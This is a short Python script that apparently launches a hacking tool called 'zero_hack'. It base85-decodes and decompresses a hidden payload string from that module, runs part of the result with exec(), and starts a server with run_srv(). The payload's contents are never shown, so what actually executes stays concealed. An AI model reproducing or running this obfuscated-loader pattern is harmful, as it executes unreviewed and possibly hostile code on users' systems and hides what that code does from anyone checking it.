import os, zlib, base64, zero_hack
raw = zlib.decompress(base64.b85decode(zero_hack._PAYLOAD.encode())).decode()
exec(raw[:raw.find("banner(anim=True)")])
run_srv()
